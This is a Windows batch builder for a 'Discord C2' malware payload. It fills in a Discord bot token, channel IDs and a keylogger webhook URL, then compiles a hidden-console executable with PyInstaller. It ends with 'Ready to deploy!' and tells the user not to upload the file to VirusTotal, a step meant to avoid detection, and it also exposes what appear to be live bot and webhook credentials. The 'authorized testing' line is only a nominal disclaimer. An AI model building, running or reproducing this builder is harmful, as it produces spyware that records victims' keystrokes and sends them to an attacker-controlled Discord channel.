@echo off
echo ===============================================
echo Discord C2 Quick Builder - Using Defaults
echo ===============================================
echo.

REM Check if UV is installed
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Installing UV package manager...
    powershell -Command "& {Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression}"
    if %errorlevel% neq 0 (
        echo ERROR: Failed to install UV!
        pause
        exit /b 1
    )
)

echo [+] Setting up environment and dependencies...
uv sync

echo [+] Building payload with default configuration...
echo   - Name: d3
echo   - Guild ID: 1375935187250057216
echo   - Channel ID: 1375935188265209989
echo   - Bot Token: MTM37NTkzNTQ5OTU0OTU0MDM3Mg...
echo   - Webhook: https://discord.com/api/webhooks/1375937047998501057/...

REM Create configured payload
copy discord_payload.py d3.py >nul

REM Replace placeholders
powershell -Command "(Get-Content 'd3.py') -replace '\{GUILD_ID\}', '1375935187250057216' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{BOT_TOKEN\}', 'MTM37NTkzNTQ5OTU0OTU0MDM3Mg.G0N_48.d3bL65IMOciVH89Ehi4oLjwWbf9yMRTKpIv41g' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{CHANNEL_ID\}', '1375935188265209989' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{KEYLOGGER_WEBHOOK\}', 'https://discord.com/api/webhooks/1375937047998501057/uyPon8TtX2_JLYwUvP_h0fZchDvpmfhsocI1OjPrHd4l-BOolP3XwFf4ymO4uguw5boA' | Set-Content 'd3.py'"

echo [+] Installing PyInstaller and building executable...
uv add pyinstaller
if not exist "dist" mkdir dist
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=d3 --distpath=dist d3.py

if %errorlevel% equ 0 (
    echo.
    echo ✅ SUCCESS! Executable created: dist\d3.exe
    del d3.py >nul 2>&1
    del d3.spec >nul 2>&1
    if exist "build" rmdir /s /q build >nul 2>&1
    echo.
    echo Ready to deploy! Remember:
    echo - Test in isolated environment
    echo - Use only for authorized testing
    echo - Do not upload to VirusTotal
    echo.
    echo Debug mode: d3.exe -d
    echo - Shows logs and sends debug hit to Discord
) else (
    echo ❌ Build failed! Check errors above.
)

pause
